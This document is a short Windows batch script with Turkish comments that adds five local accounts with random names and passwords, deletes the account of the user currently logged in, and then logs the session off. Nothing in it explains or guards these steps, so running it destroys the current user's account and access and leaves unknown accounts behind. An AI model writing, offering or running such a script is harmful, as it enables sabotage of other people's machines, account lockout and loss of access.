@echo off

rem 5 rastgele kullanıcı oluştur
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add

echo Tüm kullanıcılar başarıyla oluşturuldu.

rem Mevcut oturumdaki kullanıcıyı silme
net user %username% /delete
echo Mevcut kullanıcı %username% silindi.

rem Oturumu kapat
shutdown /l
